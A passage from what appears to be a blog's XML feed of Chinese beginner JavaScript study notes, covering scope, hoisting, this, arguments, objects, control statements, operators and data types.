title="10.2函数作用域"></a>10.2函数作用域</h3><p>①调用函数时创建函数作用域，函数执行完毕以后，函数作用域销毁。</p><p>②每调用一次函数就会创建一个新的函数作用域，它们之间互相是独立的。</p><p>③在函数作用域中可以访问全局作用域的变量，在全局作用域中不可访问函数作用域的变量。</p><p>④当在函数作用域中操作一个变量时，它会先在自身域中寻找，如果有就直接使用，如果没有就向上一级作用域中寻找，直至找到全局作用域。<br>如果全局作用域中没有找到，则会报错。</p><p>⑤在函数中要访问全局变量可以使用window对象。</p><p>⑥函数作用域中也有声明提前的特性，使用var关键字声明的变量，会在函数中所有的代码执行之前被声明。<br>函数声明也会在函数中所有的代码执行之前被创建。</p><p><img src="/js/js80.png"><br><img src="/js/js81.png"></p><h2 id="11-声明提前"><a href="#11-声明提前" class="headerlink" title="11.声明提前"></a>11.声明提前</h2><h3 id="11-1变量的声明提前"><a href="#11-1变量的声明提前" class="headerlink" title="11.1变量的声明提前"></a>11.1变量的声明提前</h3><p>使用var关键字声明的变量，会在所有代码执行之前被声明(但是不会赋值)<br>但如果声明变量时不使用var关键字，则变量不会被声明提前<br><img src="/js/js78.png"></p><h3 id="11-2函数的声明提前"><a href="#11-2函数的声明提前" class="headerlink" title="11.2函数的声明提前"></a>11.2函数的声明提前</h3><p>1.使用函数声明形式创建的函数function(){ }<br>它会在所有代码执行之前就被创建，所以我们可以在函数声明前调用函数。</p><p>2.使用函数表达式创建的函数var 函数名=function(){ },不会被提前创建，所以不能在声明前调用。</p><p><img src="/js/js79.png"></p><h2 id="12-this"><a href="#12-this" class="headerlink" title="12.this"></a>12.this</h2><p>1.解析器在调用函数时，每次都会向函数内部传递进一个隐含参数，这个隐含参数是this。<br>this指向的是一个对象。这个对象我们称为函数的上下文对象。</p><p>2.根据函数的调用方式不同，this会指向不同的对象<br>①以函数的形式调用时，this永远都是window<br>②以方法的形式调用时，this就是调用方法的那个对象</p><p><img src="/js/js82.png"></p><h2 id="13-arguments"><a href="#13-arguments" class="headerlink" title="13.arguments"></a>13.arguments</h2><h3 id="1-隐含参数"><a href="#1-隐含参数" class="headerlink" title="1.隐含参数"></a>1.隐含参数</h3><p> 在调用函数时,浏览器每次都会传递两个隐含参数:<br>  ①函数的上下文对象this<br>  ②封装实参的对象arguments</p><h3 id="2-什么是arguments"><a href="#2-什么是arguments" class="headerlink" title="2.什么是arguments"></a>2.什么是arguments</h3><p> arguments是一个类数组对象(和数组很像,但不是数组),它可以通过索引来操作数据,也可以获取长度</p><h3 id="3-保存实参"><a href="#3-保存实参" class="headerlink" title="3.保存实参"></a>3.保存实参</h3><p> 在调用函数时,我们传递的实参在arguments中保存</p><h3 id="4-用途"><a href="#4-用途" class="headerlink" title="4.用途"></a>4.用途</h3><p> arguments.length 可以用来获取实参的长度<br> 即使不定义形参,也可以通过arguments来使用实参<br> 不管定不定义形参,函数调用传递的实参都会在arguments中保存<br> arguments[0] 表示第一个实参,后面的依次类推</p><h3 id="5-callee属性"><a href="#5-callee属性" class="headerlink" title="5.callee属性"></a>5.callee属性</h3><p> arguments里有一个属性叫做callee,这个属性对应一个函数对象,就是当前正在执行的函数对象</p><p><img src="/js/js104.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> -JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第二十五篇博客</title>
      <link href="/2021/03/31/di-er-shi-wu-pian-bo-ke/"/>
      <url>/2021/03/31/di-er-shi-wu-pian-bo-ke/</url>
      
        <content type="html"><![CDATA[<h1 id="学习JavaScript的第六天-对象"><a href="#学习JavaScript的第六天-对象" class="headerlink" title="学习JavaScript的第六天(对象)"></a>学习JavaScript的第六天(对象)</h1><a id="more"></a><h2 id="1-对象Object"><a href="#1-对象Object" class="headerlink" title="1.对象Object"></a>1.对象Object</h2><p>1.JS中数据类型<br>String、 number、 Boolean、Null、undefined（五种基本数据类型）以上5种为基本数据类型，只要不是上边5种，全都是对象。<br>基本数据类型都是独立的个体，值和值之间没有关系<br>如果使用基本数据类型的值，我们所创建的变量都是独立的，不能成为一个整体</p><p>2.Object  对象<br>对象属于一种复合的数据类型，在对象中可以保存多个不同数据类型的属性。</p><h2 id="2-对象的分类"><a href="#2-对象的分类" class="headerlink" title="2.对象的分类"></a>2.对象的分类</h2><p>1.内建对象<br>ES标准中定义的对象，在任何ES的实现中都可以使用<br>比如:Math String Boolean Number Object</p><p>2.宿主对象<br>由JS的运行环境提供的对象，主要指浏览器提供的对象（目前来讲）<br>比如:BOM(浏览器对象模型)  DOM(文档对象模型) 表示的是两组数据</p><p>3.自定义对象<br>由开发人员自己创建的对象</p><h2 id="3-操作对象"><a href="#3-操作对象" class="headerlink" title="3.操作对象"></a>3.操作对象</h2><p>1.使用new关键字调用的函数,是构造函数(constructor)，构造函数是专门用来创建对象的<br>使用typeof检查一个对象时，返回一个object</p><p>2.在对象中保存的值被称为属性</p><p>3.向对象添加属性<br>语法:对象.属性名=属性值; </p><p>4.读取对象中的属性<br>语法:对象.属性名<br>如果读取对象中没有的属性，不会报错而是会返回undefiend。</p><p>5.修改对象的属性值<br>语法:对象.属性名=新值；</p><p>6.删除对象的属性<br>语法:delete 对象.属性名</p><p><img src="/js/js59.png"></p><h2 id="4-属性名"><a href="#4-属性名" class="headerlink" title="4.属性名"></a>4.属性名</h2><p>1.对象的属性名不强制要求遵守标识符的规范，但我们尽量按照标识符的规范去做。</p><p>2.如果使用特殊的属性名不能使用(.)的方式来操作而使用</p><p>另一种方式：<br>语法 对象[“属性名”]=属性值；<br>读取时也采用 对象[“属性名”]这种方式。<br>使用[ ]这种形式去操作属性值，更加的灵活。<br>在[ ]中可以传一个变量,变量的值是多少，就会读取那个属性</p><p><img src="/js/js60.png"></p><h2 id="5-属性值"><a href="#5-属性值" class="headerlink" title="5.属性值"></a>5.属性值</h2><p>在JS中属性值可以是一个任意类型的值，也可以是一个对象<br><img src="/js/js61.png"></p><h2 id="6-in-运算符"><a href="#6-in-运算符" class="headerlink" title="6.in 运算符"></a>6.in 运算符</h2><p>通过该运算符可以检查对象中是否有特定的属性值，如果有返回true，没有返回false<br>语法:“属性” in 对象</p><p><img src="/js/js62.png"></p><h2 id="7-基本数据类型和引用数据类型"><a href="#7-基本数据类型和引用数据类型" class="headerlink" title="7.基本数据类型和引用数据类型"></a>7.基本数据类型和引用数据类型</h2><p>1.基本数据类型<br>①string ②number ③boolean ④null ⑤undefined</p><p>2.引用数据类型<br>Object</p><p>3.JS中变量都是保存在栈内存中的，<br>①基本数据类型的值在栈内存中存储，值与值之间都是独立存在的，修改一个变量的值不会影响其他的变量的值。<br><img src="/js/js63.png"><br><img src="/js/js63yx.png"></p><p>②对象(object)保存在堆内存中的，每次创建一个新的对象，就会在堆内存中开辟一个新的空间，而变量保存的是对象的内存地址(对象的引用)。如果两个变量保存的是同一个对象引用，当通过一个变量修改属性时，另一个也会受到影响。<br><img src="/js/js64.png"></p><p><img src="/js/js64yx1.png"></p><p><img src="/js/js64yx2.png"></p><p>4.当比较两个基本数据类型时，就是比较两个值。<br>当比较两个引用数据类型时，它是比较两个对象的内存地址，如果两个值一摸一样，但地址不同，它也会返回false。<br><img src="/js/js65.png"></p><p><img src="/js/js65yx.png"></p><h2 id="8-对象字面量"><a href="#8-对象字面量" class="headerlink" title="8.对象字面量"></a>8.对象字面量</h2><p>1.使用对象字面量，可以在创建时，直接指定对象中的属性</p><p>2.语法: {属性名:属性值, 属性名:属性值……}</p><p>3.对象字面量的属性名可以加引号，也可以不加，建议不加,如果属性名为特殊的名字，必须加引号</p><p>4.属性名和属性值是一组一组的名值对结构<br>名和值之间用冒号(:)连接,多个名值对之间用(,)隔开<br>如果一个属性之后没有其他属性了，就不要写逗号(写了容易报错)</p><p><img src="/js/js66.png"></p><h2 id="9-枚举对象中的属性"><a href="#9-枚举对象中的属性" class="headerlink" title="9.枚举对象中的属性"></a>9.枚举对象中的属性</h2><p>1.使用for…in 语句<br>2.语法: for(var 变量 in 对象){</p><p>}</p><p>3.for…in语句 对象中有几个属性,循环就执行几次</p><p>4.每次执行时,会将对象中的一个属性的名字赋值给变量</p><p><img src="/js/js76.png"></p><h2 id="10-使用工厂方法创建对象"><a href="#10-使用工厂方法创建对象" class="headerlink" title="10.使用工厂方法创建对象"></a>10.使用工厂方法创建对象</h2><p>通过该方法可以大批量创建对象</p><p><img src="/js/js83.png"></p><p>使用工厂方法创建的对象，使用的构造函数都是Object 所以创建的对象都是Object这个类型，就导致我们无法区分出多种不同类型的对象</p>]]></content>
      
      
      
        <tags>
            
            <tag> -JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第二十四篇博客</title>
      <link href="/2021/03/31/di-er-shi-si-pian-bo-ke/"/>
      <url>/2021/03/31/di-er-shi-si-pian-bo-ke/</url>
      
        <content type="html"><![CDATA[<h1 id="学习JavaScript的第五天-语句"><a href="#学习JavaScript的第五天-语句" class="headerlink" title="学习JavaScript的第五天(语句)"></a>学习JavaScript的第五天(语句)</h1><a id="more"></a><h2 id="1-代码块"><a href="#1-代码块" class="headerlink" title="1.代码块"></a>1.代码块</h2><p>1.程序是由一条一条语句组成的，语句按照从上往下的顺序一条一条执行的。</p><p>2.在JS中使用{ }对语句进行分组,同一个{ }中的语句我们称为一组语句，它们要么都执行，要么都不执行。</p><p>3.一个{ }中的语句我们称为代码块，代码块后面不需要在编写分号(;)。</p><p>4.JS中的代码块，只具有分组的作用，没有其他用途。代码块中的内容在外部是完全可见的。</p><p><img src="/js/js46.png"></p><h2 id="2-流程控制语句"><a href="#2-流程控制语句" class="headerlink" title="2.流程控制语句"></a>2.流程控制语句</h2><p>1.JS中代码是从上到下一条一条语句执行的。</p><p>2.通过流程控制语句，可以控制程序的执行顺序，使程序可以根据一定条件来选择执行。</p><h2 id="3-语句的分类"><a href="#3-语句的分类" class="headerlink" title="3.语句的分类"></a>3.语句的分类</h2><h3 id="3-1-条件判断语句"><a href="#3-1-条件判断语句" class="headerlink" title="3.1 条件判断语句"></a>3.1 条件判断语句</h3><p>1.在执行某个语句之前使用，如果条件成立才会执行语句，条件不成立，就不执行语句。</p><p>  2.if语句</p><h4 id="语法1"><a href="#语法1" class="headerlink" title="语法1"></a>语法1</h4><p>   语法1：if（条件表达式）{<br>  语句…<br>}</p><p>1.if语句在执行时，会先对条件表达式进行求值判断，如果条件表达式值为true，则执行if后语句。如果条件表达式值为false，则不执行if后语句。</p><p>2.if语句只能控制紧随其后的那个语句，如果希望if可以执行多条语句，可以将这些语句放在代码块中。</p><p>3.if语句后的代码块不是必须编写的，尽量写上，看起来更加清晰。</p><p><img src="/js/js47.png"></p><h4 id="语法2"><a href="#语法2" class="headerlink" title="语法2"></a>语法2</h4><p> 语法2： if(条件表达式){<br>        语句……<br>}else {<br>         语句……<br>}</p><p>if…else…语句<br>当语句执行时，先对条件表达式进行判断，如果条件为true，就执行if后语句。如果条件为false，就执行else后语句。</p><p><img src="/js/js48.png"></p><h4 id="语法3"><a href="#语法3" class="headerlink" title="语法3"></a>语法3</h4><p> 语法3：if(条件表达式){<br>        语句……<br>}else if(条件表达式) {<br>         语句……<br>}else if(条件表达式){<br>          语句……<br>}else{<br>          语句……<br>}</p><p>if…else if…else<br>当该语句执行时，先对条件表达式进行求值判断<br>如果值为true，则执行当前语句<br>如果值为false，则继续判断</p><p>如果所有条件都不满足，则执行最后一个else后的语句<br>该语句中只会有一个代码块被执行，一旦代码块被执行，则直接结束语句</p><p><img src="/js/js49.png"></p><h3 id="3-2-条件分支语句"><a href="#3-2-条件分支语句" class="headerlink" title="3.2 条件分支语句"></a>3.2 条件分支语句</h3><p>1.条件分支语句也叫switch语句</p><p>2.语法：switch(条件表达式){<br>case 表达式:<br>语句…<br>break；<br>case 表达式:<br>语句…<br>break；<br>case 表达式:<br>语句…<br>break；<br>default:<br>语句…<br>break；<br>}</p><p>3.执行流程:<br>switch…case….语句<br>1.在执行时会依次将case后表达式的值和switch后的条件表达式的值进行全等比较。</p><p>2.如果比较结果为true，则从当前case处开始执行代码。<br>从当前case后所有的代码都会执行，可以在case后边跟着一个break关键字，这样可以保证只会执行当前case语句，而不会执行其他case语句。</p><p>3.如果比较结果为false，则继续向下比较。</p><p>4.如果所有的比较结果都为false，则只执行default语句。</p><p><img src="/js/js50.png"></p><h2 id="4-循环语句"><a href="#4-循环语句" class="headerlink" title="4.循环语句"></a>4.循环语句</h2><p>通过循环语句可以反复的执行一段代码多次</p><h2 id="4-1分类"><a href="#4-1分类" class="headerlink" title="4.1分类"></a>4.1分类</h2><h3 id="4-1-1-While循环"><a href="#4-1-1-While循环" class="headerlink" title="4.1.1 While循环"></a>4.1.1 While循环</h3><p>1.语法<br>语法:while(条件表达式){<br>语句……<br>}<br>(循环中代码块中内容也可被叫做循环体)</p><p>2.While执行流程<br>While语句在执行时，先对条件表达式进行求值判断<br>1.如果值为true，就执行循环体，循环体执行完毕以后，继续对条件表达式进行判断，如果为true，继续执行循环体。依次类推。</p><p>2.如果值为false，就终止循环。</p><p>3.创建一个循环，往往需要三个步骤:</p><p>1.初始化一个变量<br>2.在循环中设置一个条件表达式。<br>3.定义一个更新表达式，每次更新初始化变量。</p><p><img src="/js/js51.png"></p><h3 id="4-1-2-do…while循环"><a href="#4-1-2-do…while循环" class="headerlink" title="4.1.2 do…while循环"></a>4.1.2 do…while循环</h3><p>1.语法:<br>do{<br>语句…<br>}while(条件表达式)</p><p>2.do…while执行流程：<br>1.do…while在执行循环时，先执行循环体。</p><p>2.执行循环体完毕后，在对while后的条件表达式进行判断，如果为true，继续执行循环体，执行完毕后再进行判断，以此类推。</p><p>3.如果为false，则终止循环。</p><p><img src="/js/js52.png"></p><p>4.实际上while和do…while功能类似<br>不同的是while先判断后执行，do…while先执行后判断。<br>do…while可以保证循环体至少循环一次(不管条件是否成立)，而while不可以</p><h3 id="4-1-3-for循环"><a href="#4-1-3-for循环" class="headerlink" title="4.1.3 for循环"></a>4.1.3 for循环</h3><p>1.for语句，也是一个循环语句，也称为for循环。</p><p>2.在for循环中，为我们提供了专门放三个表达式的位置:<br>1.初始化表达式； 2.条件表达式； 3.更新表达式；</p><p>3.语法:<br>  for(①初始化表达式;②条件表达式;④更新表达式){<br>③语句……<br>}</p><p>4.执行流程:<br>①执行初始化表达式，初始化变量(只执行一次)</p><p>②执行条件表达式，判断是否执行<br>如果为true，则执行循环体③<br>如果为false，则终止循环</p><p>④执行更新表达式，更新后继续执行重复②</p><p><img src="/js/js53.png"></p><h3 id="4-1-3-for循环的嵌套"><a href="#4-1-3-for循环的嵌套" class="headerlink" title="4.1.3 for循环的嵌套"></a>4.1.3 for循环的嵌套</h3><p>外部for执行一次，内部for循环n次（如果n为5,就是外部循环1次，内部循环5次）</p><p><img src="/js/js54.png"></p><p><img src="/js/js55.png"></p><p><img src="/js/js56.png"></p><h2 id="5-break关键字-结束整个循环"><a href="#5-break关键字-结束整个循环" class="headerlink" title="5.break关键字(结束整个循环)"></a>5.break关键字(结束整个循环)</h2><p>1.break可以用来退出swtich和循环语句</p><p>2.不可以在if语句中使用break和continue</p><p>3.break关键字，会立即终止离它最近的循环语句</p><p>4.可以为循环语句创建一个label标签<br>label:循环语句<br>使用break语句时，可以在break后面加一个label标签，这样break可以结束指定的循环。</p><p><img src="/js/js57.png"></p><h2 id="6-continue关键字-结束当次循环"><a href="#6-continue关键字-结束当次循环" class="headerlink" title="6.continue关键字(结束当次循环)"></a>6.continue关键字(结束当次循环)</h2><p>1.continue关键字用于跳过当次循环</p><p>2.continue默认只会离他最近的循环起作用</p><p>3.不可以在if中使用，用于循环中</p><p>4.使用continue语句时，可以在continue后面加一个label标签，这样continue可以结束指定的循环。</p><p><img src="/js/js58.png"></p><h2 id="7-prompt-函数"><a href="#7-prompt-函数" class="headerlink" title="7.prompt()函数"></a>7.prompt()函数</h2><p>1.prompt()可以弹出一个提示框，该提示框中会有一个文本框，用户可在文本框中输入内容，该函数需要一个字符串做为参数，该字符串会作为提示框的提示内容。</p><p>2.prompt()函数的返回值类型为string</p><h2 id="8-测试程序性能-计时器"><a href="#8-测试程序性能-计时器" class="headerlink" title="8.测试程序性能(计时器)"></a>8.测试程序性能(计时器)</h2><p>1.在程序开始前开启计时器<br>console.time(“计时器的名字”)可以用来开启一个计时器，它需要一个字符串作为参数，这个字符串将会作为计时器的标识。</p><p>2.在程序结束后关闭计时器<br>console.timeEnd(“计时器的名字”)可以用来停止一个计时器，它需要一个计时器的名字作为参数。</p><h2 id="9-Math-sqrt"><a href="#9-Math-sqrt" class="headerlink" title="9.Math.sqrt()"></a>9.Math.sqrt()</h2><p>可以通过Math.sqrt()对一个数进行开方（开根号）<br>例如Math.sqrt(4) 表示根号4 值为2</p>]]></content>
      
      
      
        <tags>
            
            <tag> -JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第二十三篇博客</title>
      <link href="/2021/03/31/di-er-shi-san-pian-bo-ke/"/>
      <url>/2021/03/31/di-er-shi-san-pian-bo-ke/</url>
      
        <content type="html"><![CDATA[<h1 id="学习JavaScript的第四天-运算符"><a href="#学习JavaScript的第四天-运算符" class="headerlink" title="学习JavaScript的第四天(运算符)"></a>学习JavaScript的第四天(运算符)</h1><a id="more"></a><h2 id="1-运算符"><a href="#1-运算符" class="headerlink" title="1.运算符"></a>1.运算符</h2><p>1.运算符也叫操作符，通过运算符可以对一个或多个值进行运算，并获取运算结果。</p><p>比如typeof就是运算符，可以获得一个值的类型<br>它会将该值的类型以字符串的形式返回，该值的类型(number、string、boolean、undefined、object)</p><p><img src="/js/js24.png"></p><h2 id="2-算数运算符"><a href="#2-算数运算符" class="headerlink" title="2.算数运算符"></a>2.算数运算符</h2><p>当对非Number类型的值进行运算时，会将这些值转换为Number然后在运算(除了字符串的加法,其他都是)<br>任何值和NaN做运算,运算结果都为NaN</p><h3 id="2-1-（加）"><a href="#2-1-（加）" class="headerlink" title="2.1 +（加）"></a>2.1 +（加）</h3><p>1.可以对两个值进行加法运算，并将结果进行返回</p><p>2.如果两个字符串相加，则会做拼串（字符串拼接到一起），会将两个字符串拼接成一个字符串。</p><p>3.任何的值和字符串做加法运算时，都会先转换为字符串，然后再和字符串进行拼串操作。</p><p><img src="/js/js25.png"></p><p><img src="/js/js26.png"></p><h3 id="2-2-（减）"><a href="#2-2-（减）" class="headerlink" title="2.2 -（减）"></a>2.2 -（减）</h3><p>可以对两个值进行减法运算，并将结果返回<br><img src="/js/js27.png"></p><h3 id="2-3-（乘）"><a href="#2-3-（乘）" class="headerlink" title="2.3 *（乘）"></a>2.3 *（乘）</h3><p>可以对两个数值进行乘法运算</p><h3 id="2-4-（除）"><a href="#2-4-（除）" class="headerlink" title="2.4 /（除）"></a>2.4 /（除）</h3><p>可以对两个数值进行除法运算</p><h3 id="2-5-（取余数）"><a href="#2-5-（取余数）" class="headerlink" title="2.5 % （取余数）"></a>2.5 % （取余数）</h3><p>取模运算(取余数)</p><p><img src="/js/js28.png"></p><h3 id="2-6-补充"><a href="#2-6-补充" class="headerlink" title="2.6 补充"></a>2.6 补充</h3><p>任何值做”-”、”<em>”、”/”运算时都会自动转换为Number<br>我们可以利用这一提点来做隐式转换<br>可以通过为一个值-0、</em>1、/1来将其转换为Number<br>原理和Number（）函数一样，使用起来更加简单</p><h2 id="3-一元运算符"><a href="#3-一元运算符" class="headerlink" title="3.一元运算符"></a>3.一元运算符</h2><p>1.一元运算符，只需要一个操作数</p><p>2.一元运算符:+、-<br>① + 正号  正号不会对数字产生任何影响<br>② -    负号  负号可以对数字进行负号的取反(类似于负负得正)</p><p>3.对于非Number的值，会将其先转换为Number，然后在运算。<br>可以对一个其他数据类型使用+(正号),来将其转换为Number，它的原理和Number()函数一样。</p><p><img src="/js/js29.png"></p><h2 id="4-自增和自减"><a href="#4-自增和自减" class="headerlink" title="4.自增和自减"></a>4.自增和自减</h2><h3 id="4-1-自增"><a href="#4-1-自增" class="headerlink" title="4.1 自增(++)"></a>4.1 自增(++)</h3><p>通过自增可以使变量在自身的基础上加1</p><p>1.对于一个变量自增以后，原变量会立即自增加1</p><p>2.自增分为两种：后++(a++)和前++(++a)<br>无论是a++还是++a，都会立即使原变量的值自增1<br>不同的是a++和++a的值不同<br>a++的值等于原变量的值(自增以前的值)<br>++a的值等于新值(自增以后的值)<br><img src="/js/js30.png"></p><p><img src="/js/js31.png"></p><h3 id="4-2-自减-–"><a href="#4-2-自减-–" class="headerlink" title="4.2 自减(–)"></a>4.2 自减(–)</h3><p>通过自减可以使变量在自身的基础上减1</p><p>1.自减分为两种: 后–(a–)和前–(–a)<br>无论是a–还是–a，都会立即使原变量的值自减1<br>不同的是a–和–a的值不同<br>a–的值等于原变量的值(自减以前的值)<br>–a的值等于新值(自减以后的值)</p><p><img src="/js/js32.png"></p><h3 id="4-3-例子"><a href="#4-3-例子" class="headerlink" title="4.3 例子"></a>4.3 例子</h3><p><img src="/js/js33.png"></p><h2 id="5-逻辑运算符"><a href="#5-逻辑运算符" class="headerlink" title="5.逻辑运算符"></a>5.逻辑运算符</h2><p>JS中有三种逻辑运算符</p><h3 id="5-1-非"><a href="#5-1-非" class="headerlink" title="5.1 !(非)"></a>5.1 !(非)</h3><p>1.可以对一个值进行非运算，非运算就是指对一个布尔值进行取反操作: 1.true 变 false 2.false 变true</p><p>2.如果对一个布尔值进行两次取反操作，它不会发生变化</p><p>3.如果对非布尔值进行运算，会将其转换为布尔值，在取反,所以我们利用该特点，来将一个其他的数据类型转换为布尔值。</p><p>4.可以将任意一个数据类型取两次反，来将其转换为布尔值。原理和Boolean()函数一样，使用起来简单<br><img src="/js/js34.png"></p><h3 id="5-2-amp-amp-与"><a href="#5-2-amp-amp-与" class="headerlink" title="5.2 &amp;&amp; 与"></a>5.2 &amp;&amp; 与</h3><p>1.&amp;&amp;可以对符号两侧的值进行运算，并返回结果</p><p>2.运算规则:<br>1.两个值中只要有一个值为false，就会返回false</p><p>2.两个值都为true时，就会返回true</p><p>3.JS中”与”属于短路的与，如果第一个值为false，将不会检查第二个值。</p><p>3.例子<br><img src="/js/js35.png"></p><h3 id="5-3-或"><a href="#5-3-或" class="headerlink" title="5.3 || 或"></a>5.3 || 或</h3><p>1.||可以对符号两侧的值进行运算，并返回结果</p><p>2.运算规则:<br>1.两个值中只要有一个true，就会返回true</p><p>2.两个值都为false，才会返回false</p><p>3.JS中”或”属于短路的或，如果第一个值为true，将不会检查第二个值</p><p>3.例子<br><img src="/js/js36.png"></p><h3 id="5-4-与-amp-amp-、或-非布尔值的情况"><a href="#5-4-与-amp-amp-、或-非布尔值的情况" class="headerlink" title="5.4 与(&amp;&amp;)、或(||)非布尔值的情况"></a>5.4 与(&amp;&amp;)、或(||)非布尔值的情况</h3><p>1.对于非布尔值进行与、或运算时，会先将其转换为布尔值，在进行运算，并返回原值</p><p>2.与运算:<br>1.如果第一个值为true，则必然会返回第二个值</p><p>2.如果第一个值为false，则直接返回第一个false值</p><p>3.例子<br><img src="/js/js37.png"></p><p>3.或运算:<br>1.如果第一个值为true，则直接返回第一个值</p><p>2.如果第一个值为false，则返回第二个值</p><p>3.例子<br><img src="/js/js38.png"></p><h2 id="6-赋值运算符"><a href="#6-赋值运算符" class="headerlink" title="6.赋值运算符"></a>6.赋值运算符</h2><p>1.=(等于) 将符号右边的值赋值给符号左侧的变量</p><p>2.+=(加等于) a+=5 等价于 a=a+5;</p><p>3.-=(减等于) a-=5 等价于 a=a-5;</p><p>4.<em>=(乘等于) a</em>=5 等价于 a=a*5;</p><p>5./=(除等于) a/=5 等价于 a=a/5;</p><p>6.%=(取模等于，取余数) a%=5 等价于 a=a%5;</p><p><img src="/js/js39.png"></p><h2 id="7-关系运算符"><a href="#7-关系运算符" class="headerlink" title="7.关系运算符"></a>7.关系运算符</h2><p>1.通过关系运算符可以比较两个值之间的大小关系，如果关系成立，返回true。如果关系不成立，返回false</p><p>2.大于号(&gt;)<br>判断符号左侧的值是否大于右侧的值<br>如果关系成立返回true，关系不成立返回false</p><p>3.大于等于号(&gt;=)<br>判断符号左侧的值是否大于等于右侧的值<br>如果关系成立(成立一个条件即可)返回true，关系不成立返回false。</p><p>4.小于号(&lt;)<br>判断符号左侧的值是否小于符号右侧的值<br>如果关系成立返回true，关系不成立返回false</p><p>5.小于等于号(&lt;=)<br>判断符号左侧的值是否小于等于右侧的值<br>如果关系成立(成立一个条件即可)返回true，关系不成立返回false。</p><p>6.对于非数值的情况下:<br>1.对于非数值情况进行比较时，会将其先转换为数值，再进行比较。</p><p>2.如果符号两侧都为字符串时，不会将其转换为数字进行比较，而会分别比较字符串中字符的Unicode编码</p><p>例子<br><img src="/js/js40.png"></p><h2 id="8-相等运算符"><a href="#8-相等运算符" class="headerlink" title="8.相等运算符"></a>8.相等运算符</h2><p>1.相等运算符用来判断两个值是否相等，如果相等返回true，不相等返回false</p><p>2.使用==(等等) 来做相等运算<br>当使用==来比较两个值时，如果值的类型不同，则会自动进行类型转换，将其转换为相同的类型后，在进行比较。</p><p>3.使用!=(不等) 来做不相等运算<br>不相等用来判断两个值是否不相等，如果不相等返回true，否则返回false。<br>使用!=来比较两个值时，如果值的类型不同，则会自动进行类型转换，将其转换为相同类型，再进行比较<br>如果转换后相等，则返回false。</p><p>4.=== 全等<br>用来判断两个值是否全等，它和等等相似，但不同的是它不会做自动类型转换,如果两个值的类型不同，直接返回false。</p><p>5.!== 不全等<br>用来判断两个值是否不全等，它和不等类似，但不同的是它不会做类型转换，如果两个类型值不同，直接返回true。</p><p><img src="/js/js43.png"></p><h2 id="9-条件运算符"><a href="#9-条件运算符" class="headerlink" title="9.条件运算符"></a>9.条件运算符</h2><p>1.条件运算符也叫三元运算符</p><p>2.语法 条件表达式?语句1:语句2；</p><p>3.执行流程<br>条件运算符在执行时，先对条件表达式进行求值<br>如果值为true，执行语句1<br>如果值为false, 执行语句2</p><p>4.如果条件表达式不是布尔值时，会先将其转换为布尔值在进行运算</p><p><img src="/js/js44.png"></p><h2 id="10-运算符优先级"><a href="#10-运算符优先级" class="headerlink" title="10.运算符优先级"></a>10.运算符优先级</h2><p>1.“,”（逗号）运算符，可以分割多个语句，一般用在声明多个变量。</p><p>2.JS中优先级:先乘除后加减</p><p>3.在JS中有运算符优先级的表，在表中越靠上，优先级越高，优先级越高就越先计算 如果优先级一样，则从左往右计算</p><p>4.()(括号)可以改变优先级</p><p><img src="/js/js45.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> -JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第二十二篇博客</title>
      <link href="/2021/03/31/di-er-shi-er-pian-bo-ke/"/>
      <url>/2021/03/31/di-er-shi-er-pian-bo-ke/</url>
      
        <content type="html"><![CDATA[<h1 id="学习JavaScript的第三天-数据类型"><a href="#学习JavaScript的第三天-数据类型" class="headerlink" title="学习JavaScript的第三天(数据类型)"></a>学习JavaScript的第三天(数据类型)</h1><a id="more"></a><h2 id="1-数据类型"><a href="#1-数据类型" class="headerlink" title="1.数据类型"></a>1.数据类型</h2><p>①数据类型指的就是字面量的类型。<br>②JS中一共有6钟数据类型。（描述类型时，首字母大写）<br>1.String 字符串<br>2.Number 数值<br>3.Boolean 布尔值<br>4.Null 空值<br>5.Undefined 未定义<br>6.Object 对象<br>其中String、Number、Boolean、Null、Undefined属于基本数据类型。<br>而Object属于引用数据类型</p><h2 id="2-数据类型详解"><a href="#2-数据类型详解" class="headerlink" title="2.数据类型详解"></a>2.数据类型详解</h2><h3 id="2-1-String字符串类型"><a href="#2-1-String字符串类型" class="headerlink" title="2.1 String字符串类型"></a>2.1 String字符串类型</h3><p>①在JS中字符串需要使用引号引起来。</p><p>②使用双引号、单引号都可以，但不能混着用<br>（’hello”）这种混着用是错误的。</p><p>③引号不能嵌套，双引号里不能放双引号，单引号不能放单引号。<br><img src="/js/js6.png"></p><p>④在字符串中我们可以使用“\“作为转义字符，当表示一些特殊符号时可以用”\”进行转义。<br>\“ 表示双引号<br>\’ 表示单引号<br>\n 表示换行<br>\t  表示制表符<br>“\\“  表示斜杠(\ )<br><img src="/js/js7.png"><br><img src="/js/js8.png"></p><h3 id="2-2Number"><a href="#2-2Number" class="headerlink" title="2.2Number"></a>2.2Number</h3><p>①在JS中所有的数值都是Number类型，包括整数和浮点数(小数)。<br><img src="/js/js9.png"></p><p>②JS中可以表示数字的最大值、最小值<br>Number.MAX_VALUE (JS中表示数字的最大值)是字面量<br>值为1.7976931348623157e+308<br>如果使用Number表示的数字超过了最大值，则会返回一个<br>Infinity 表示正无穷    -Infinity表示负无穷<br>使用typeof检查Infinity也会返回number<br>Number.MIN_VALUE（JS中表示数字最小值）<br>值为5e-324  大于0的最小值<br><img src="/js/js10.png"></p><p>③NaN(字面值) 表示不是一个数字<br><img src="/js/js11.png"></p><p>④数值运算<br><img src="/js/js12.png"></p><h3 id="2-3Boolean-布尔值"><a href="#2-3Boolean-布尔值" class="headerlink" title="2.3Boolean(布尔值)"></a>2.3Boolean(布尔值)</h3><p>①Boolean(布尔类型的值有两个):true 表示真   false 表示假</p><p>②布尔值主要用来逻辑判断，<br>如果条件为真，就做什么事<br>如果条件为假，就做什么事<br><img src="/js/js13.png"><br>引号不要随便加，加上双引号，就会变成字符串类型。</p><h3 id="2-4Null-空值-和Undefined-未定义的值"><a href="#2-4Null-空值-和Undefined-未定义的值" class="headerlink" 